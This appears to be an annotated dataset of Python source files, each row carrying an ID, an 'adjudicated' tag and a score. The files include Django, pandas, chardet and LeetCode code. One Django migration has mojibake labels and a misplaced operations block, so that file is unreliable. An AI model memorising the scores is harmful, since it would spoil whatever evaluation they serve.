""is_signed_integer_dtype"",<<NEWL>>    ""is_sparse"",<<NEWL>>    ""is_string_dtype"",<<NEWL>>    ""is_timedelta64_dtype"",<<NEWL>>    ""is_timedelta64_ns_dtype"",<<NEWL>>    ""is_unsigned_integer_dtype"",<<NEWL>>    ""pandas_dtype"",<<NEWL>>]"
381	adjudicated	2	"""""""<<NEWL>> The GeometryColumns and SpatialRefSys models for the Oracle spatial<<NEWL>> backend.<<NEWL>><<NEWL>> It should be noted that Oracle Spatial does not have database tables<<NEWL>> named according to the OGC standard, so the closest analogs are used.<<NEWL>> For example, the `USER_SDO_GEOM_METADATA` is used for the GeometryColumns<<NEWL>> model and the `SDO_COORD_REF_SYS` is used for the SpatialRefSys model.<<NEWL>>""""""<<NEWL>>from django.contrib.gis.db import models<<NEWL>>from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin<<NEWL>><<NEWL>><<NEWL>>class OracleGeometryColumns(models.Model):<<NEWL>>    ""Maps to the Oracle USER_SDO_GEOM_METADATA table.""<<NEWL>>    table_name = models.CharField(max_length=32)<<NEWL>>    column_name = models.CharField(max_length=1024)<<NEWL>>    srid = models.IntegerField(primary_key=True)<<NEWL>>    # TODO: Add support for `diminfo` column (type MDSYS.SDO_DIM_ARRAY).<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        app_label = ""gis""<<NEWL>>        db_table = ""USER_SDO_GEOM_METADATA""<<NEWL>>        managed = False<<NEWL>><<NEWL>>    def __str__(self):<<NEWL>>        return ""%s - %s (SRID: %s)"" % (self.table_name, self.column_name, self.srid)<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def table_name_col(cls):<<NEWL>>        """"""<<NEWL>>        Return the name of the metadata column used to store the feature table<<NEWL>>        name.<<NEWL>>        """"""<<NEWL>>        return ""table_name""<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def geom_col_name(cls):<<NEWL>>        """"""<<NEWL>>        Return the name of the metadata column used to store the feature<<NEWL>>        geometry column.<<NEWL>>        """"""<<NEWL>>        return ""column_name""<<NEWL>><<NEWL>><<NEWL>>class OracleSpatialRefSys(models.Model, SpatialRefSysMixin):<<NEWL>>    ""Maps to the Oracle MDSYS.CS_SRS table.""<<NEWL>>    cs_name = models.CharField(max_length=68)<<NEWL>>    srid = models.IntegerField(primary_key=True)<<NEWL>>    auth_srid = models.IntegerField()<<NEWL>>    auth_name = models.CharField(max_length=256)<<NEWL>>    wktext = models.CharField(max_length=2046)<<NEWL>>    # Optional geometry representing the bounds of this coordinate<<NEWL>>    # system.  By default, all are NULL in the table.<<NEWL>>    cs_bounds = models.PolygonField(null=True)<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        app_label = ""gis""<<NEWL>>        db_table = ""CS_SRS""<<NEWL>>        managed = False<<NEWL>><<NEWL>>    @property<<NEWL>>    def wkt(self):<<NEWL>>        return self.wktext"
101	adjudicated	2	"from django.conf import settings<<NEWL>>from django.utils.translation import get_supported_language_variant<<NEWL>>from django.utils.translation.trans_real import language_code_re<<NEWL>><<NEWL>>from . import Error, Tags, register<<NEWL>><<NEWL>>E001 = Error(<<NEWL>>    'You have provided an invalid value for the LANGUAGE_CODE setting: {!r}.',<<NEWL>>    id='translation.E001',<<NEWL>>)<<NEWL>><<NEWL>>E002 = Error(<<NEWL>>    'You have provided an invalid language code in the LANGUAGES setting: {!r}.',<<NEWL>>    id='translation.E002',<<NEWL>>)<<NEWL>><<NEWL>>E003 = Error(<<NEWL>>    'You have provided an invalid language code in the LANGUAGES_BIDI setting: {!r}.',<<NEWL>>    id='translation.E003',<<NEWL>>)<<NEWL>><<NEWL>>E004 = Error(<<NEWL>>    'You have provided a value for the LANGUAGE_CODE setting that is not in '<<NEWL>>    'the LANGUAGES setting.',<<NEWL>>    id='translation.E004',<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_setting_language_code(app_configs, **kwargs):<<NEWL>>    """"""Error if LANGUAGE_CODE setting is invalid.""""""<<NEWL>>    tag = settings.LANGUAGE_CODE<<NEWL>>    if not isinstance(tag, str) or not language_code_re.match(tag):<<NEWL>>        return [Error(E001.msg.format(tag), id=E001.id)]<<NEWL>>    return []<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_setting_languages(app_configs, **kwargs):<<NEWL>>    """"""Error if LANGUAGES setting is invalid.""""""<<NEWL>>    return [<<NEWL>>        Error(E002.msg.format(tag), id=E002.id)<<NEWL>>        for tag, _ in settings.LANGUAGES if not isinstance(tag, str) or not language_code_re.match(tag)<<NEWL>>    ]<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_setting_languages_bidi(app_configs, **kwargs):<<NEWL>>    """"""Error if LANGUAGES_BIDI setting is invalid.""""""<<NEWL>>    return [<<NEWL>>        Error(E003.msg.format(tag), id=E003.id)<<NEWL>>        for tag in settings.LANGUAGES_BIDI if not isinstance(tag, str) or not language_code_re.match(tag)<<NEWL>>    ]<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_language_settings_consistent(app_configs, **kwargs):<<NEWL>>    """"""Error if language settings are not consistent with each other.""""""<<NEWL>>    try:<<NEWL>>        get_supported_language_variant(settings.LANGUAGE_CODE)<<NEWL>>    except LookupError:<<NEWL>>        return [E004]<<NEWL>>    else:<<NEWL>>        return []"
290	adjudicated	0	# Copyright (c) 2020, Oracle and/or its affiliates.<<NEWL>>#<<NEWL>># This program is free software; you can redistribute it and/or modify<<NEWL>># it under the terms of the GNU General Public License, version 2.0, as<<NEWL>># published by the Free Software Foundation.<<NEWL>>#<<NEWL>># This program is also distributed with certain software (including<<NEWL>># but not limited to OpenSSL) that is licensed under separate terms,<<NEWL>># as designated in a particular file or component or in included license<<NEWL>># documentation.  The authors of MySQL hereby grant you an<<NEWL>># additional permission to link the program and your derivative works<<NEWL>># with the separately licensed software that they have included with<<NEWL>># MySQL.<<NEWL>>#<<NEWL>># Without limiting anything contained in the foregoing, this file,<<NEWL>># which is part of MySQL Connector/Python, is also subject to the<<NEWL>># Universal FOSS Exception, version 1.0, a copy of which can be found at<<NEWL>># http://oss.oracle.com/licenses/universal-foss-exception.<<NEWL>>#<<NEWL>># This program is distributed in the hope that it will be useful, but<<NEWL>># WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.<<NEWL>># See the GNU General Public License, version 2.0, for more details.<<NEWL>>#<<NEWL>># You should have received a copy of the GNU General Public License<<NEWL>># along with this program; if not, write to the Free Software Foundation, Inc.,<<NEWL>># 51 Franklin St, Fifth Floor, Boston, MA 02110-1301  USA<<NEWL>><<NEWL>>from django.db.backends.mysql.schema import DatabaseSchemaEditor as MySQLDatabaseSchemaEditor<<NEWL>><<NEWL>><<NEWL>>class DatabaseSchemaEditor(MySQLDatabaseSchemaEditor):<<NEWL>><<NEWL>>    def quote_value(self, value):<<NEWL>>        self.connection.ensure_connection()<<NEWL>>        if isinstance(value, str):<<NEWL>>            value = value.replace('%', '%%')<<NEWL>>        quoted = self.connection.connection.converter.escape(value)<<NEWL>>        if isinstance(value, str) and isinstance(quoted, bytes):<<NEWL>>            quoted = quoted.decode()<<NEWL>>        return quoted
41	adjudicated	1	"import glob<<NEWL>>import logging<<NEWL>>import socket<<NEWL>><<NEWL>>import debugpy<<NEWL>>import pandas as pd<<NEWL>>from rdkit import Chem<<NEWL>><<NEWL>>logger = logging.getLogger(__name__)<<NEWL>>logger.addHandler(logging.NullHandler())<<NEWL>><<NEWL>><<NEWL>>def getipaddress():<<NEWL>>    return socket.gethostbyname(socket.getfqdn())<<NEWL>><<NEWL>><<NEWL>>def debug():<<NEWL>>    logger.info(""Waiting for debugger to connect"")<<NEWL>>    if (<<NEWL>>        socket.getfqdn().startswith(""dcc"")<<NEWL>>        or socket.getfqdn().startswith(""mol"")<<NEWL>>        or socket.getfqdn().startswith(""ccc"")<<NEWL>>    ):<<NEWL>>        debugpy.listen(address=(getipaddress(), 3000))<<NEWL>>        debugpy.wait_for_client()<<NEWL>>    debugpy.breakpoint()<<NEWL>><<NEWL>><<NEWL>>class ListDataset:<<NEWL>>    def __init__(self, seqs):<<NEWL>>        self.seqs = seqs<<NEWL>><<NEWL>>    def __getitem__(self, index):<<NEWL>>        return self.seqs[index]<<NEWL>><<NEWL>>    def __len__(self):<<NEWL>>        return len(self.seqs)<<NEWL>><<NEWL>><<NEWL>>def transform_single_embedding_to_multiple(smiles_z_map):<<NEWL>>    """"""Transforms an embedding map of the format smi->embedding to<<NEWL>>    smi-> {""canonical_embeddings"":embedding}. This function exists<<NEWL>>    as a compatibility layer<<NEWL>><<NEWL>>    Args:<<NEWL>>        smiles_z_map ([type]): [description]<<NEWL>>    """"""<<NEWL>>    retval = dict()<<NEWL>>    for key in smiles_z_map:<<NEWL>>        retval[key] = {""canonical_embeddings"": smiles_z_map[key]}<<NEWL>>    return retval<<NEWL>><<NEWL>><<NEWL>>def normalize_smiles(smi, canonical, isomeric):<<NEWL>>    normalized = Chem.MolToSmiles(<<NEWL>>        Chem.MolFromSmiles(smi), canonical=canonical, isomericSmiles=isomeric<<NEWL>>    )<<NEWL>>    return normalized<<NEWL>><<NEWL>><<NEWL>>def get_all_proteins(affinity_dir: str):<<NEWL>>    files = glob.glob(affinity_dir + ""/*.csv"")<<NEWL>>    all_proteins = []<<NEWL>>    logger.info(files)<<NEWL>>    for file in files:<<NEWL>>        df = pd.read_csv(file)<<NEWL>>        all_proteins.extend(df[""protein""].tolist())<<NEWL>>    return set(all_proteins)<<NEWL>><<NEWL>><<NEWL>>def append_to_file(filename, line):<<NEWL>>    with open(filename, ""a"") as f:<<NEWL>>        f.write(line + ""\n"")<<NEWL>><<NEWL>><<NEWL>>def write_to_file(filename, line):<<NEWL>>    with open(filename, ""w"") as f:<<NEWL>>        f.write(line + ""\n"")"
121	adjudicated	1	"######################## BEGIN LICENSE BLOCK ########################<<NEWL>># The Original Code is mozilla.org code.<<NEWL>>#<<NEWL>># The Initial Developer of the Original Code is<<NEWL>># Netscape Communications Corporation.<<NEWL>># Portions created by the Initial Developer are Copyright (C) 1998<<NEWL>># the Initial Developer. All Rights Reserved.<<NEWL>>#<<NEWL>># Contributor(s):<<NEWL>>#   Mark Pilgrim - port to Python<<NEWL>>#<<NEWL>># This library is free software; you can redistribute it and/or<<NEWL>># modify it under the terms of the GNU Lesser General Public<<NEWL>># License as published by the Free Software Foundation; either<<NEWL>># version 2.1 of the License, or (at your option) any later version.<<NEWL>>#<<NEWL>># This library is distributed in the hope that it will be useful,<<NEWL>># but WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU<<NEWL>># Lesser General Public License for more details.<<NEWL>>#<<NEWL>># You should have received a copy of the GNU Lesser General Public<<NEWL>># License along with this library; if not, write to the Free Software<<NEWL>># Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA<<NEWL>># 02110-1301  USA<<NEWL>>######################### END LICENSE BLOCK #########################<<NEWL>><<NEWL>>from .chardistribution import EUCKRDistributionAnalysis<<NEWL>>from .codingstatemachine import CodingStateMachine<<NEWL>>from .mbcharsetprober import MultiByteCharSetProber<<NEWL>>from .mbcssm import CP949_SM_MODEL<<NEWL>><<NEWL>><<NEWL>>class CP949Prober(MultiByteCharSetProber):<<NEWL>>    def __init__(self):<<NEWL>>        super().__init__()<<NEWL>>        self.coding_sm = CodingStateMachine(CP949_SM_MODEL)<<NEWL>>        # NOTE: CP949 is a superset of EUC-KR, so the distribution should be<<NEWL>>        #       not different.<<NEWL>>        self.distribution_analyzer = EUCKRDistributionAnalysis()<<NEWL>>        self.reset()<<NEWL>><<NEWL>>    @property<<NEWL>>    def charset_name(self):<<NEWL>>        return ""CP949""<<NEWL>><<NEWL>>    @property<<NEWL>>    def language(self):<<NEWL>>        return ""Korean"""
61	adjudicated	0	"# Copyright 2016 Google Inc. All rights reserved.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>import mock<<NEWL>>from protorpc import message_types<<NEWL>><<NEWL>>import main<<NEWL>><<NEWL>><<NEWL>>def test_list_greetings(testbed):<<NEWL>>    api = main.GreetingApi()<<NEWL>>    response = api.list_greetings(message_types.VoidMessage())<<NEWL>>    assert len(response.items) == 2<<NEWL>><<NEWL>><<NEWL>>def test_get_greeting(testbed):<<NEWL>>    api = main.GreetingApi()<<NEWL>>    request = main.GreetingApi.get_greeting.remote.request_type(id=1)<<NEWL>>    response = api.get_greeting(request)<<NEWL>>    assert response.message == 'goodbye world!'<<NEWL>><<NEWL>><<NEWL>>def test_multiply_greeting(testbed):<<NEWL>>    api = main.GreetingApi()<<NEWL>>    request = main.GreetingApi.multiply_greeting.remote.request_type(<<NEWL>>        times=4,<<NEWL>>        message='help I\'m trapped in a test case.')<<NEWL>>    response = api.multiply_greeting(request)<<NEWL>>    assert response.message == 'help I\'m trapped in a test case.' * 4<<NEWL>><<NEWL>><<NEWL>>def test_authed_greet(testbed):<<NEWL>>    api = main.AuthedGreetingApi()<<NEWL>><<NEWL>>    with mock.patch('main.endpoints.get_current_user') as user_mock:<<NEWL>>        user_mock.return_value = None<<NEWL>>        response = api.greet(message_types.VoidMessage())<<NEWL>>        assert response.message == 'Hello, Anonymous'<<NEWL>><<NEWL>>        user_mock.return_value = mock.Mock()<<NEWL>>        user_mock.return_value.email.return_value = 'user@example.com'<<NEWL>>        response = api.greet(message_types.VoidMessage())<<NEWL>>        assert response.message == 'Hello, user@example.com'"
170	adjudicated	3	"from django.utils.cache import patch_vary_headers<<NEWL>>from django.utils.deprecation import MiddlewareMixin<<NEWL>>from django.utils.regex_helper import _lazy_re_compile<<NEWL>>from django.utils.text import compress_sequence, compress_string<<NEWL>><<NEWL>>re_accepts_gzip = _lazy_re_compile(r'\bgzip\b')<<NEWL>><<NEWL>><<NEWL>>class GZipMiddleware(MiddlewareMixin):<<NEWL>>    """"""<<NEWL>>    Compress content if the browser allows gzip compression.<<NEWL>>    Set the Vary header accordingly, so that caches will base their storage<<NEWL>>    on the Accept-Encoding header.<<NEWL>>    """"""<<NEWL>>    def process_response(self, request, response):<<NEWL>>        # It's not worth attempting to compress really short responses.<<NEWL>>        if not response.streaming and len(response.content) < 200:<<NEWL>>            return response<<NEWL>><<NEWL>>        # Avoid gzipping if we've already got a content-encoding.<<NEWL>>        if response.has_header('Content-Encoding'):<<NEWL>>            return response<<NEWL>><<NEWL>>        patch_vary_headers(response, ('Accept-Encoding',))<<NEWL>><<NEWL>>        ae = request.META.get('HTTP_ACCEPT_ENCODING', '')<<NEWL>>        if not re_accepts_gzip.search(ae):<<NEWL>>            return response<<NEWL>><<NEWL>>        if response.streaming:<<NEWL>>            # Delete the `Content-Length` header for streaming content, because<<NEWL>>            # we won't know the compressed size until we stream it.<<NEWL>>            response.streaming_content = compress_sequence(response.streaming_content)<<NEWL>>            del response['Content-Length']<<NEWL>>        else:<<NEWL>>            # Return the compressed content only if it's actually shorter.<<NEWL>>            compressed_content = compress_string(response.content)<<NEWL>>            if len(compressed_content) >= len(response.content):<<NEWL>>                return response<<NEWL>>            response.content = compressed_content<<NEWL>>            response['Content-Length'] = str(len(response.content))<<NEWL>><<NEWL>>        # If there is a strong ETag, make it weak to fulfill the requirements<<NEWL>>        # of RFC 7232 section-2.1 while also allowing conditional request<<NEWL>>        # matches on ETags.<<NEWL>>        etag = response.get('ETag')<<NEWL>>        if etag and etag.startswith('""'):<<NEWL>>            response['ETag'] = 'W/' + etag<<NEWL>>        response['Content-Encoding'] = 'gzip'<<NEWL>><<NEWL>>        return response"
30	adjudicated	2	"from collections import defaultdict, deque<<NEWL>><<NEWL>><<NEWL>>class Solution(object):<<NEWL>>    def shortestAlternatingPaths(self, n, redEdges, blueEdges):<<NEWL>>        """"""<<NEWL>>        :type n: int<<NEWL>>        :type redEdges: List[List[int]]<<NEWL>>        :type blueEdges: List[List[int]]<<NEWL>>        :rtype: List[int]<<NEWL>>        """"""<<NEWL>>        graph = defaultdict(list)<<NEWL>>        red = defaultdict(lambda: False)<<NEWL>>        blue = defaultdict(lambda: False)<<NEWL>>        visited = defaultdict(lambda: False)<<NEWL>>        res = [10**9]*n<<NEWL>>        res[0] = 0<<NEWL>>        for u, v in redEdges:<<NEWL>>            red[(u, v)] = True<<NEWL>>            graph[u].append(v)<<NEWL>>        for u, v in blueEdges:<<NEWL>>            blue[(u, v)] = True<<NEWL>>            graph[u].append(v)<<NEWL>>        queue = deque()<<NEWL>><<NEWL>>        # -1: red<<NEWL>>        # 0: whatever<<NEWL>>        # 1: blue<<NEWL>>        # current node, previous edge 's color, maxDistance<<NEWL>>        queue.append((0, 0, 0))<<NEWL>>        while queue:<<NEWL>>            u, c, d = queue.popleft()<<NEWL>>            for v in graph[u]:<<NEWL>>                if visited[(u, v, c)] == False:<<NEWL>>                    if c == 0:  # whatever<<NEWL>>                        if red[(u, v)] and blue[(u, v)]:<<NEWL>>                            color = 0<<NEWL>>                        elif red[(u, v)] and not blue[(u, v)]:<<NEWL>>                            color = -1<<NEWL>>                        elif not red[(u, v)] and blue[(u, v)]:<<NEWL>>                            color = 1<<NEWL>>                        queue.append((v, color, d+1))<<NEWL>>                        res[v] = min(res[v], d+1)<<NEWL>>                        visited[(u, v, c)] = True<<NEWL>>                    elif c == -1 and blue[(u, v)]:<<NEWL>>                        queue.append((v, 1, d+1))<<NEWL>>                        res[v] = min(res[v], d+1)<<NEWL>>                        visited[(u, v, c)] = True<<NEWL>>                    elif c == 1 and red[(u, v)]:<<NEWL>>                        queue.append((v, -1, d+1))<<NEWL>>                        res[v] = min(res[v], d+1)<<NEWL>>                        visited[(u, v, c)] = True<<NEWL>>        for i in range(n):<<NEWL>>            if res[i] == 10**9:<<NEWL>>                res[i] = -1<<NEWL>>        return res<<NEWL>><<NEWL>><<NEWL>>t = Solution()<<NEWL>># t.shortestAlternatingPaths(5, [[0, 1], [1, 2], [2, 3], [3, 4]], [<<NEWL>>#                            [1, 2], [2, 3], [3, 1]])<<NEWL>>t.shortestAlternatingPaths(3, [[0, 1], [0, 2]], [[1, 0]])"
183	adjudicated	3	"#<<NEWL>># Copyright 2018 the original author or authors.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>import structlog<<NEWL>>from voltha.extensions.omci.tasks.get_mds_task import GetMdsTask<<NEWL>><<NEWL>><<NEWL>>class BrcmGetMdsTask(GetMdsTask):<<NEWL>>    """"""<<NEWL>>    OpenOMCI Get MIB Data Sync value task - Broadcom ONU<<NEWL>><<NEWL>>    On successful completion, this task will call the 'callback' method of the<<NEWL>>    deferred returned by the start method and return the value of the MIB<<NEWL>>    Data Sync attribute of the ONT Data ME<<NEWL>>    """"""<<NEWL>>    name = ""BRCM: Get MDS Task""<<NEWL>><<NEWL>>    def __init__(self, omci_agent, device_id):<<NEWL>>        """"""<<NEWL>>        Class initialization<<NEWL>><<NEWL>>        :param omci_agent: (OmciAdapterAgent) OMCI Adapter agent<<NEWL>>        :param device_id: (str) ONU Device ID<<NEWL>>        """"""<<NEWL>>        self.log = structlog.get_logger(device_id=device_id)<<NEWL>>        self.log.debug('function-entry')<<NEWL>><<NEWL>>        super(BrcmGetMdsTask, self).__init__(omci_agent, device_id)<<NEWL>><<NEWL>>        self.name = BrcmGetMdsTask.name<<NEWL>>        self._device = omci_agent.get_device(device_id)<<NEWL>>        self._omci_managed = False      # TODO: Look up capabilities/model number/check handler<<NEWL>><<NEWL>>    def perform_get_mds(self):<<NEWL>>        """"""<<NEWL>>        Get the 'mib_data_sync' attribute of the ONU<<NEWL>>        """"""<<NEWL>>        self.log.debug('function-entry')<<NEWL>>        self.log.info('perform-get-mds')<<NEWL>><<NEWL>>        if self._omci_managed:<<NEWL>>            return super(BrcmGetMdsTask, self).perform_get_mds()<<NEWL>><<NEWL>>        # Non-OMCI managed BRCM ONUs always return 0 for MDS, use the MIB<<NEWL>>        # sync value and depend on an accelerated mib resync to do the<<NEWL>>        # proper comparison<<NEWL>><<NEWL>>        self.deferred.callback(self._device.mib_synchronizer.mib_data_sync)<<NEWL>>"
212	adjudicated	2	"""""""<<NEWL>>For backwards-compatibility. keep this file.<<NEWL>>(Many people are going to have key bindings that rely on this file.)<<NEWL>>""""""<<NEWL>>from .app import *<<NEWL>><<NEWL>>__all__ = [<<NEWL>>    # Old names.<<NEWL>>    ""HasArg"",<<NEWL>>    ""HasCompletions"",<<NEWL>>    ""HasFocus"",<<NEWL>>    ""HasSelection"",<<NEWL>>    ""HasValidationError"",<<NEWL>>    ""IsDone"",<<NEWL>>    ""IsReadOnly"",<<NEWL>>    ""IsMultiline"",<<NEWL>>    ""RendererHeightIsKnown"",<<NEWL>>    ""InEditingMode"",<<NEWL>>    ""InPasteMode"",<<NEWL>>    ""ViMode"",<<NEWL>>    ""ViNavigationMode"",<<NEWL>>    ""ViInsertMode"",<<NEWL>>    ""ViInsertMultipleMode"",<<NEWL>>    ""ViReplaceMode"",<<NEWL>>    ""ViSelectionMode"",<<NEWL>>    ""ViWaitingForTextObjectMode"",<<NEWL>>    ""ViDigraphMode"",<<NEWL>>    ""EmacsMode"",<<NEWL>>    ""EmacsInsertMode"",<<NEWL>>    ""EmacsSelectionMode"",<<NEWL>>    ""IsSearching"",<<NEWL>>    ""HasSearch"",<<NEWL>>    ""ControlIsSearchable"",<<NEWL>>]<<NEWL>><<NEWL>># Keep the original classnames for backwards compatibility.<<NEWL>>HasValidationError = lambda: has_validation_error<<NEWL>>HasArg = lambda: has_arg<<NEWL>>IsDone = lambda: is_done<<NEWL>>RendererHeightIsKnown = lambda: renderer_height_is_known<<NEWL>>ViNavigationMode = lambda: vi_navigation_mode<<NEWL>>InPasteMode = lambda: in_paste_mode<<NEWL>>EmacsMode = lambda: emacs_mode<<NEWL>>EmacsInsertMode = lambda: emacs_insert_mode<<NEWL>>ViMode = lambda: vi_mode<<NEWL>>IsSearching = lambda: is_searching<<NEWL>>HasSearch = lambda: is_searching<<NEWL>>ControlIsSearchable = lambda: control_is_searchable<<NEWL>>EmacsSelectionMode = lambda: emacs_selection_mode<<NEWL>>ViDigraphMode = lambda: vi_digraph_mode<<NEWL>>ViWaitingForTextObjectMode = lambda: vi_waiting_for_text_object_mode<<NEWL>>ViSelectionMode = lambda: vi_selection_mode<<NEWL>>ViReplaceMode = lambda: vi_replace_mode<<NEWL>>ViInsertMultipleMode = lambda: vi_insert_multiple_mode<<NEWL>>ViInsertMode = lambda: vi_insert_mode<<NEWL>>HasSelection = lambda: has_selection<<NEWL>>HasCompletions = lambda: has_completions<<NEWL>>IsReadOnly = lambda: is_read_only<<NEWL>>IsMultiline = lambda: is_multiline<<NEWL>><<NEWL>>HasFocus = has_focus  # No lambda here! (Has_focus is callable that returns a callable.)<<NEWL>>InEditingMode = in_editing_mode"
352	adjudicated	0	"from time import time<<NEWL>><<NEWL>>from bot import DOWNLOAD_DIR, LOGGER<<NEWL>>from bot.helper.ext_utils.bot_utils import get_readable_file_size, MirrorStatus, EngineStatus, get_readable_time<<NEWL>>from bot.helper.ext_utils.fs_utils import get_path_size<<NEWL>><<NEWL>>class ZipStatus:<<NEWL>>    def __init__(self, name, size, gid, listener):<<NEWL>>        self.__name = name<<NEWL>>        self.__size = size<<NEWL>>        self.__gid = gid<<NEWL>>        self.__listener = listener<<NEWL>>        self.__uid = listener.uid<<NEWL>>        self.__start_time = time()<<NEWL>>        self.message = listener.message<<NEWL>><<NEWL>>    def gid(self):<<NEWL>>        return self.__gid<<NEWL>><<NEWL>>    def speed_raw(self):<<NEWL>>        return self.processed_bytes() / (time() - self.__start_time)<<NEWL>><<NEWL>>    def progress_raw(self):<<NEWL>>        try:<<NEWL>>            return self.processed_bytes() / self.__size * 100<<NEWL>>        except:<<NEWL>>            return 0<<NEWL>><<NEWL>>    def progress(self):<<NEWL>>        return f'{round(self.progress_raw(), 2)}%'<<NEWL>><<NEWL>>    def speed(self):<<NEWL>>        return f'{get_readable_file_size(self.speed_raw())}/s'<<NEWL>><<NEWL>>    def name(self):<<NEWL>>        return self.__name<<NEWL>><<NEWL>>    def size_raw(self):<<NEWL>>        return self.__size<<NEWL>><<NEWL>>    def size(self):<<NEWL>>        return get_readable_file_size(self.__size)<<NEWL>><<NEWL>>    def eta(self):<<NEWL>>        try:<<NEWL>>            seconds = (self.size_raw() - self.processed_bytes()) / self.speed_raw()<<NEWL>>            return f'{get_readable_time(seconds)}'<<NEWL>>        except:<<NEWL>>            return '-'<<NEWL>><<NEWL>>    def status(self):<<NEWL>>        return MirrorStatus.STATUS_ARCHIVING<<NEWL>><<NEWL>>    def processed_bytes(self):<<NEWL>>        if self.__listener.newDir:<<NEWL>>            return get_path_size(f""{DOWNLOAD_DIR}{self.__uid}10000"")<<NEWL>>        else:<<NEWL>>            return get_path_size(f""{DOWNLOAD_DIR}{self.__uid}"") - self.__size<<NEWL>><<NEWL>>    def download(self):<<NEWL>>        return self<<NEWL>><<NEWL>>    def cancel_download(self):<<NEWL>>        LOGGER.info(f'Cancelling Archive: {self.__name}')<<NEWL>>        if self.__listener.suproc is not None:<<NEWL>>            self.__listener.suproc.kill()<<NEWL>>        self.__listener.onUploadError('archiving stopped by user!')<<NEWL>><<NEWL>>    def eng(self):<<NEWL>>        return EngineStatus.STATUS_ZIP"
243	adjudicated	0	# Generated by Django 3.2.16 on 2023-02-10 16:24<<NEWL>><<NEWL>>from django.db import migrations, models<<NEWL>>from django.template.backends import django<<NEWL>><<NEWL>><<NEWL>>class Migration(migrations.Migration):<<NEWL>><<NEWL>>    initial = True<<NEWL>><<NEWL>>    dependencies = [<<NEWL>>    ]<<NEWL>><<NEWL>><<NEWL>>operations = [<<NEWL>>        migrations.CreateModel(<<NEWL>>            name='Category',<<NEWL>>            fields=[<<NEWL>>                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),<<NEWL>>                ('name', models.CharField(db_index=True, max_length=100, verbose_name='ÐÐ°ÑÐµÐ³Ð¾ÑÐ¸Ñ')),<<NEWL>>                ('slug', models.SlugField(max_length=255, unique=True, verbose_name='URL')),<<NEWL>>            ],<<NEWL>>            options={<<NEWL>>                'verbose_name': 'ÐÐ°ÑÐµÐ³Ð¾ÑÐ¸Ñ',<<NEWL>>                'verbose_name_plural': 'ÐÐ°ÑÐµÐ³Ð¾ÑÐ¸Ð¸',<<NEWL>>                'ordering': ['id'],<<NEWL>>            },<<NEWL>>        ),<<NEWL>>        migrations.CreateModel(<<NEWL>>            name='Food',<<NEWL>>            fields=[<<NEWL>>                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),<<NEWL>>                ('title', models.CharField(max_length=255, verbose_name='ÐÐ°Ð³Ð¾Ð»Ð¾Ð²Ð¾Ðº')),<<NEWL>>                ('slug', models.SlugField(max_length=255, unique=True, verbose_name='URL')),<<NEWL>>                ('content', models.TextField(blank=True, verbose_name='Ð¢ÐµÐºÑÑ ÑÑÐ°ÑÑÐ¸')),<<NEWL>>                ('photo', models.ImageField(upload_to='photos/%Y/%m/%d/', verbose_name='Ð¤Ð¾ÑÐ¾')),<<NEWL>>                ('time_create', models.DateTimeField(auto_now_add=True, verbose_name='ÐÑÐµÐ¼Ñ ÑÐ¾Ð·Ð´Ð°Ð½Ð¸Ñ')),<<NEWL>>                ('time_update', models.DateTimeField(auto_now=True, verbose_name='ÐÑÐµÐ¼Ñ Ð¸Ð·Ð¼ÐµÐ½ÐµÐ½Ð¸Ñ')),<<NEWL>>                ('is_published', models.BooleanField(default=True, verbose_name='ÐÑÐ±Ð»Ð¸ÐºÐ°ÑÐ¸Ñ')),<<NEWL>>                ('cat', models.ForeignKey(on_delete=django.db.models.deletion.PROTECT, to='food.category', verbose_name='ÐÐ°ÑÐµÐ³Ð¾ÑÐ¸Ð¸')),<<NEWL>>            ],<<NEWL>>            options={<<NEWL>>                'verbose_name': 'ÐÐ·Ð²ÐµÑÑÐ½ÑÐµ ,Ð±Ð»ÑÐ´Ð°',<<NEWL>>                'verbose_name_plural': 'ÐÐ·Ð²ÐµÑÑÐ½ÑÐµ Ð±Ð»ÑÐ´Ð°',<<NEWL>>                'ordering': ['-time_create', 'title'],<<NEWL>>            },<<NEWL>>        ),<<NEWL>>    ]
